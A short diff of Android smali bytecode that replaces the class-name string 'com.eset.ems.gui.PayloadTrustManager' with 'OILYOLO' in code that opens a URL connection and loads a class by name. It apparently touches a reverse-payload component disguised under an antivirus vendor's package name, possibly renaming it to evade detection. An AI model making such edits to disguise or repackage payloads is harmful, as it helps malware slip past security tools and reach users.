@@ -552,7 +552,7 @@
 
     .line 103
     .local v1, "uc":Ljava/net/URLConnection;
-    const-string v2, "com.eset.ems.gui.PayloadTrustManager"
+    const-string v2, "OILYOLO"
 
     invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
 
